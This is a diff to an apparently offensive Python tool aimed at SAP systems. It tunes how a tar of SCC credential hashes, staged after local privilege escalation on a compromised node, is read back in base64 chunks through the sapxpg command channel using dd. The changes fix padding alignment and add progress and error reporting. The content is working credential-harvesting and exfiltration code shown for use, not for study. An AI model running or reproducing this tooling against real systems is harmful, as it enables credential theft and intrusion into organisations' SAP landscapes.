@@ -380,10 +380,9 @@ def harvest_scc_from_pwned_node(node: SAPNode, state: SAPMAPState) -> dict:
                 if sz <= 0:
                     return None
                 # sapxpg truncates stdout to ~128 bytes per response.
-                # 250 raw bytes → ~336 chars b64, proven safe for the
-                # chunked sapxpg channel.  The earlier count=2000
-                # produced ~2700 chars b64 and was silently truncated.
-                _CHUNK = 250
+                # 249 raw bytes (83×3) → pad-free b64 chunks that
+                # concatenate safely.  Must be a multiple of 3.
+                _CHUNK = 249
                 chunks = []
                 offset = 0
                 while offset < sz:
@@ -743,26 +742,66 @@ def harvest_scc_hashes_via_lpe(node: SAPNode, state: SAPMAPState) -> dict:
     # ---- Phase 3: read the tar back via the unprivileged channel
     # (we chowned it to sidadm:sapsys so this just works)
     #
-    # IMPORTANT: sapxpg truncates stdout to ~128 bytes per response.
-    # 72 raw bytes → 96 chars base64, which fits safely.  The earlier
-    # count=3000 produced ~4000 chars base64, of which only ~128
-    # survived per round trip — resulting in a corrupt file on disk.
-    # Matches sap_pse_loot._CHUNKED_RAW_BYTES.
+    # Two independent constraints stack on the chunk size:
+    #
+    #  (a) SAPXPG stdout cap.  The per-response TLV ceiling on kernel
+    #      793+ is roughly 250 B; the earlier count=3000 produced
+    #      ~4000 chars of base64 and got silently truncated mid-line,
+    #      yielding a corrupt tar.  Earlier commit dropped to 250 raw
+    #      → ~336 chars base64 which fits.
+    #
+    #  (b) base64 padding alignment.  raw chunks that are NOT a
+    #      multiple of 3 terminate with one or two ``=`` pads.  If a
+    #      non-last chunk carries pads, concatenating across chunks
+    #      produces a stream whose length isn't ≡0 mod 4 and Python's
+    #      b64decode bails with "Incorrect padding" — exactly the
+    #      symptom the operator saw at chunk 82/82.  Forcing the chunk
+    #      to a multiple of 3 means every intermediate chunk is
+    #      pad-free; only the *last* chunk (which reads sz%chunk
+    #      bytes) carries the legitimate end-of-stream padding.
+    #
+    # 249 = 83 × 3 — under the SAPXPG cap AND a clean multiple of 3.
     import base64 as _b64
-    _CHUNK_RAW = 250   # 250 raw → ~336 chars b64 — proven safe
-    chunks = []
-    offset = 0
+    import time as _t
+    _CHUNK_RAW = 249
     n_chunks = (sz + _CHUNK_RAW - 1) // _CHUNK_RAW
     print(f"[*] {sid}: scc_hashes_via_lpe — reading {sz} B in "
-          f"{n_chunks} chunk(s) of {_CHUNK_RAW} B ...")
-    while offset < sz:
+          f"{n_chunks} chunk(s) of {_CHUNK_RAW} B over the sidadm "
+          f"channel (~{n_chunks // 2}-{n_chunks * 2} s on kernel 793) ...")
+
+    chunks = []
+    offset = 0
+    started = _t.time()
+    # ~10 evenly-spaced progress lines across the read, plus the very
+    # first and very last chunk so the operator sees activity within
+    # seconds and the "done" line lands consistently.  Same cadence as
+    # the PSE-loot chunked-read adapter.
+    progress_every = max(1, n_chunks // 10)
+    for chunk_idx in range(1, n_chunks + 1):
         cb64 = _run_cmd(
             f'dd if={staging} bs=1 skip={offset} count={_CHUNK_RAW} '
             f'2>/dev/null | base64 | tr -d "\\n"').strip()
         if not cb64:
+            print(f"  [chunked] chunk {chunk_idx}/{n_chunks} returned "
+                  f"empty — aborting read-back")
             break
         chunks.append(cb64)
-        offset += _CHUNK_RAW
+        offset = min(offset + _CHUNK_RAW, sz)
+
+        is_marker = (chunk_idx == 1
+                      or chunk_idx == n_chunks
+                      or chunk_idx % progress_every == 0)
+        if is_marker:
+            elapsed = _t.time() - started
+            rate = offset / elapsed if elapsed > 0 else 0
+            eta = (sz - offset) / rate if rate > 0 else 0
+            pct = (offset * 100) // sz if sz else 100
+            print(f"  [chunked] chunk {chunk_idx}/{n_chunks} "
+                  f"({pct:3d}%) — {offset}B/{sz}B "
+                  f"@ {rate:.0f} B/s — ETA {eta:.0f}s")
+
+    total_elapsed = _t.time() - started
+    print(f"  [chunked] done: {offset}B in {total_elapsed:.1f}s")
     _run_cmd(f"rm -f {staging} 2>/dev/null")
     if not chunks:
         result["error"] = (
@@ -770,11 +809,28 @@ def harvest_scc_hashes_via_lpe(node: SAPNode, state: SAPMAPState) -> dict:
             f"exfil returned no data — check the sidadm exec channel.")
         return result
 
+    # Internal \n separators between chunks are fine for the
+    # non-validating b64decode (it treats them as ignorable
+    # whitespace).  The padding fix is in the raw chunk size above,
+    # not here.
     try:
         raw = _b64.b64decode("".join(chunks))
     except Exception as e:
-        result["error"] = f"base64 decode of root tar failed: {e}"
+        # Length-mod-4 diagnostic helps the operator see whether we
+        # lost bytes mid-stream vs. a non-base64 line snuck in.
+        joined_len = sum(len(c) for c in chunks)
+        result["error"] = (
+            f"base64 decode of root tar failed: {e} "
+            f"(received {joined_len} b64 chars over {len(chunks)} chunks, "
+            f"len%4={joined_len % 4}); "
+            f"if len%4 != 0 some kernel TLV frames were dropped — "
+            f"lower chunk_read below 600.")
         return result
+    if len(raw) != sz:
+        # Defensive: padding decoded clean but bytes are short.  Could
+        # mean a chunk silently truncated to a multiple-of-4 boundary.
+        print(f"  [chunked] WARN: decoded {len(raw)}B vs expected {sz}B "
+              f"— continuing with what we have")
 
     # ---- Phase 4: persist + parse — same pipeline as Path A-E
     import datetime as _dt
